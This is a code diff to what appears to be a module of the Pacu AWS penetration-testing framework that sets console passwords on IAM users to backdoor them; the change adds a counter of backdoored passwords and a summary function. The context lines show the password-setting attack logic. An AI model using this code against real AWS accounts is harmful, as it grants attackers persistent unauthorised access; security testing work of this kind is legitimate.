@@ -47,6 +47,7 @@ def main(args, pacu_main):
     ######
 
     users = []
+    summary_data = {}
     client = pacu_main.get_boto3_client('iam')
 
     if args.usernames is not None:
@@ -77,6 +78,7 @@ def main(args, pacu_main):
 
     target_user = ''
     password = create_valid_password(password_policy)
+    summary_data['backdoored_password_count'] = 0
     for user in users:
         if args.usernames is None:
             target_user = input('  Do you want to target the user {} (y/n)? '.format(user))
@@ -92,14 +94,14 @@ def main(args, pacu_main):
                         PasswordResetRequired=False
                     )
                     print('  Password: {}\n'.format(password))
-
+                    summary_data['backdoored_password_count'] += 1
                 except Exception as error:
                     print('  Failed to set password: {} most likely already has a password. The error is shown here:\n{}'.format(user, error))
 
                     quit = input('Based on the error returned, would you like to continue to the next user (y) or cancel (n)? ')
                     if quit == 'n':
                         print('  User cancelled. Quitting.')
-                        return
+                        return summary_data
 
             else:
                 try:
@@ -109,20 +111,24 @@ def main(args, pacu_main):
                         PasswordResetRequired=False
                     )
                     print('  Password: {}\n'.format(password))
+                    summary_data['backdoored_password_count'] += 1
                 except Exception as error:
                     print('  Failed to update password: {} most likely doesn\'t have a login profile. The error is shown here:\n{}'.format(user, error))
 
                     quit = input('Based on the error returned, would you like to continue to the next user (y) or cancel (n)? ')
                     if quit == 'n':
                         print('  User cancelled. Quitting.')
-                        return
+                        return summary_data
 
     print('{} completed.\n'.format(module_info['name']))
-    return
+    return summary_data
 
 
 def summary(data, pacu_main):
-    raise NotImplementedError
+    out = ''
+    if 'backdoored_password_count' in data:
+        out += '  {} Password(s) Backdoored\n'.format(data['backdoored_password_count'])
+    return out
 
 
 def create_valid_password(password_policy):
